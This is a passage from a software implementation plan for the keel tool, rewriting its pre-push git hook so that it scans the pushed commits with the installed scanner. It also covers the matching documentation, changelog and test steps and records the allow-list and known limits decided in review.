    SCAN="tests/supply-chain-scan.sh"
else
    printf 'keel guard: no scanner reachable, so nothing was checked. Push allowed.\n' >&2
    exit 0
fi

printf 'keel guard: scanning before push\n'
if $SCAN; then
    exit 0
fi
```

with

```bash
# The installed keel's scanner, never one from the repository being pushed: a branch that edits
# tests/supply-chain-scan.sh would otherwise be judged by its own copy, and could weaken the check
# on the very push that publishes the change. With no keel reachable nothing is checked, and it
# says so rather than refusing: keel is often on PATH only inside an agent session, and a refusal
# outside one teaches --no-verify by reflex.
if ! command -v keel >/dev/null 2>&1; then
    printf 'keel guard: keel is not on PATH, so nothing was scanned. Push allowed.\n' >&2
    exit 0
fi

# What git feeds the hook is what gets scanned: each pushed commit and the history it carries, and
# never the working tree, which can hold a file the commit lacks or lack one it carries. git always
# passes the remote and its URL, so a hook with no arguments is one run by hand, and the working
# tree is what there is to scan. With git's arguments and nothing pushed, a delete or a push with
# nothing to update, nothing is published and nothing is scanned.
#
# The hook is written by the keel that installed it, and the scan runs with the keel on PATH, which
# can be older: one with no --push ignores it and scans the working tree while reading as a clean
# scan of the push. So it is asked first, and an older one says so and scans the working tree, as
# this hook did before, rather than pass a push it never looked at. Its help is read whole, not
# piped to grep -q, since grep stopping early would fail that pipeline under pipefail.
refused=0
if [ "$#" -eq 0 ]; then
    printf 'keel guard: scanning the working tree\n'
    keel scan || refused=1
elif [ -n "$pushed" ]; then
    case "$(keel --help 2>/dev/null)" in
        *"scan --push"*)
            printf 'keel guard: scanning before push\n'
            for sha in $pushed; do
                keel scan --push "$1" "$sha" || refused=1
            done ;;
        *)
            printf 'keel guard: the keel on PATH is too old to scan the commits being pushed, so the working tree is scanned instead. Update keel to scan what is pushed.\n' >&2
            keel scan || refused=1 ;;
    esac
fi
[ "$refused" -eq 0 ] && exit 0
```

(d) In the help text, immediately above the line
`        say "  scan --push <remote> <commit>   the same scan of a commit being pushed, and of its history's key files"`,
insert:

```bash
        # The pre-push hook `keel guard install` writes reads this help for the words "scan --push"
        # to tell a keel that has it from an older one. Keep them, or every hook installed since reads
        # this keel as too old and scans the working tree.
```

Lint: run the shellcheck command from the global constraints.

In `tests/supply-chain-scan.sh`, replace the comment lines

```bash
# `--exclude-standard` keeps ignored scratch out of it. The cost is that the pre-push hook can flag
# something not actually being pushed, which is a false stop rather than a false pass, and the
# suppression marker is there for it.
```

with

```bash
# `--exclude-standard` keeps ignored scratch out of it. When git feeds the pre-push hook refs, it
# does not read this list: it scans the commits being pushed, through `keel scan --push`, which
# writes each commit's tree to a directory of its own. Run by hand, or with a keel on PATH too old
# for --push, the hook scans this list.
```

In `docs/03-install-and-distribution.md`, in the paragraph beginning
`The pre-push hook refuses three things.`, replace the sentence
`` A push carrying anything `keel scan` flags. `` with:

```markdown
A push carrying anything `keel scan --push` flags: the hook runs it once for each commit a ref
is pushed to, which scans that commit's tree and the key files anywhere in the history the push
carries, never the working tree. The scanner is the installed keel's, the one `keel` on PATH
runs, never the pushed repository's own `tests/supply-chain-scan.sh`, so a branch cannot weaken
the check on the push that publishes the change. Where `keel` on PATH is a symlink into a clone
of keel, that clone's working tree is the installed keel, so in keel's own repository a branch
checked out there is scanned by its own copy. With no `keel` on PATH the hook says nothing was
scanned and lets the push through, and with a `keel` too old for `--push` it says so and scans
the working tree instead. Run by hand, with no arguments, it scans the working tree; with
nothing to push, it scans nothing.
```

and at the end of that same paragraph, after
`` `conventions.protect_default_branch` to `false`. ``, add the sentence:
`` The hooks are written at install time, so running `keel guard install` again picks up a newer keel's hooks. ``
Rewrap the paragraph to 100 columns.

In `README.md`, replace

```markdown
Pre-push refuses anything `keel scan` flags, a push straight to the default branch, and a push
whose profile is weaker than what is already on the remote. Pre-commit is inert until
`gates.commit_guard` turns it on. Detail is in
```

with

```markdown
Pre-push refuses anything `keel scan` flags in the tree being pushed or a key file in the history
it carries, a push straight to the default branch, and a push whose profile is weaker than what is
already on the remote. Pre-commit is inert until `gates.commit_guard` turns it on. Detail is in
```

In `CHANGELOG.md`, add as the first bullet under `## Unreleased`:

```markdown
- The pre-push hook runs `keel scan --push` on each commit a ref is pushed to, not the working
  tree, and only with the installed keel's scanner, never the repository's own
  `tests/supply-chain-scan.sh`. With no `keel` on PATH it says nothing was scanned and allows the
  push; with a `keel` too old for `--push` it says so and scans the working tree. An existing
  install keeps its old hook until `keel guard install` is run again in that clone.
```

In `docs/ideas/push-scan-reads-pushed-commits.md`, replace the Status row with
`| Status | built via docs/plans/2026-09-27-push-scan-reads-pushed-commits.md |` and the Next row
with `| Next | Nothing |`. The record also cites three `bin/keel` phrases this task deletes. It
describes the hook as it stood when it was shaped, so pin each to that commit rather than
re-pointing it, with the Edit tool. Each pair is old text, then new text, fenced for the same
reason as task 1's; each OLD is unique in the record, since the first and third differ in the
words after the citation:

```text
OLD: `bin/keel#if command -v keel >/dev/null 2>&1; then` through `bin/keel#if $SCAN; then`
NEW: `if command -v keel >/dev/null 2>&1; then` through `if $SCAN; then` in `bin/keel` at `f0b6d44`

OLD: `bin/keel#elif [ -x tests/supply-chain-scan.sh ]; then`
NEW: `elif [ -x tests/supply-chain-scan.sh ]; then` in `bin/keel` at `f0b6d44`

OLD: `bin/keel#if command -v keel >/dev/null 2>&1; then` orders
NEW: `if command -v keel >/dev/null 2>&1; then` in `bin/keel` at `f0b6d44` orders
```

- [x] **Step 4: Run it and watch it pass**

Run: `tests/test-keel.sh`
Expected: PASS, including the eight new guard cases, `the generated pre-push hook is shellcheck
clean`, and every existing pre-push case, with a final line with 0 failed.

Then run `tests/validate-citations.sh` and repair what it reports, per the global constraints.

- [x] **Step 5: Run the suite at the unit boundary, then hand over**

Run: `tests/run-tests.sh`
Expected: `All test files passed`, or reds this task did not cause, each named and matched against
the start record. This is the one suite run the task schedules.

```bash
git add bin/keel tests/test-keel.sh tests/supply-chain-scan.sh docs/03-install-and-distribution.md \
        README.md CHANGELOG.md docs/ideas/push-scan-reads-pushed-commits.md
git status --porcelain
```

Stage exactly those paths and stop. **Do not commit.** The coordinator commits after both review
passes, with `git commit -m "fix(guard): the pre-push hook scans the pushed commits with the installed keel"`.
Paste the `git status --porcelain` output into your report; if it lists anything this task did not
touch, say so and leave it unstaged.

---

## Not in this plan

| Item | Why not here | Where it goes |
|---|---|---|
| `keel doctor` noticing an installed hook older than the running keel | An existing install keeps the old hook, which scans the working tree, until `keel guard install` is re-run; the changelog says so. Detecting it is a doctor feature with its own design | A `shape-idea` record, if a stale hook turns up in practice |
| The pushed profile's view in the commit guard | The idea record's "Not decided here" names it; nothing in the decisions touches the pre-commit hook | Unchanged |
| A Windows run of the executable-bit restore | `git update-index --chmod` exists for core.fileMode false, which no CI job exercises | `docs/ideas/ci-platform-coverage.md`, row (b) |
| Content scans of intermediate commits beyond key-file names | Decided against on 2026-09-27: about one full scan per commit | Unchanged |
| A pushed tag that points at a tree or a blob | `scan_push` refuses what is not a commit, naming it, so such a push needs `--no-verify` | Unchanged, a known limit |
| Scan time per pushed ref | Measured on this repository: 6.2 s for `--push` against 5.5 s for the working-tree scan | Unchanged |

## After the final reviews

Done on 2026-09-28, each from a failing test, outside the task structure above:

- **Allow-list policy, decided by the user: refuse.** An entry in `.keel/scan-allow` covers the
  version of the path the tip holds. `scan_push` sends `--secret-paths` every pushed version the
  tip does not hold with the same blob, and `--secret-paths` no longer reads the allow list, so a
  live key put at an allowed path and restored or deleted before the tip is refused. A reviewed
  older version is pinned by a line naming the path and then its blob, which `scan_push_gone` checks
  before a version reaches `--secret-paths`: without it, a first push to a remote with no fetched
  refs refused every older version of a regenerated fixture.
- The hook reads git's stdin lines from the right, so a push source holding a space no longer
  shifts the fields (the scan, the default-branch check and the loosening check).
- Not done: skipping a commit `<remote>` already reaches, so a new tag or branch on a published
  commit is not refused over it. Tried and removed in review: remote-tracking refs record the last
  fetch, possibly from another URL, and after `git remote set-url` the skip published a payload
  unscanned. Asking the remote itself (`git ls-remote`) would be authoritative, at a network call
  per push; it is a known limit until someone needs it.
- `keel guard status` calls a hook without `scan --push` stale.
- `scan_push_in` sets `HOME` and `XDG_CONFIG_HOME` to the work directory, and `scan_push_checkout`
  sets `core.precomposeunicode false`.
